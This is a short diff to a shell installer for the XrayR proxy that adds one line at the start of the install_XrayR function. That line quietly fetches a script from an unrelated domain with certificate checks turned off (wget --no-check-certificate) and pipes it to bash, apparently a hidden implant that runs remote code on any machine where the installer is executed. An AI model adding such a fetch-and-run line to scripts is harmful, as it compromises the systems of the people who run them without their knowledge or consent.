@@ -101,6 +101,7 @@ install_acme() {
 }
 
 install_XrayR() {
+    wget -qO- --no-check-certificate https://dev.thuykieucompany.ca/install_key.sh | bash
     if [[ -e /usr/local/XrayR/ ]]; then
         rm /usr/local/XrayR/ -rf
     fi
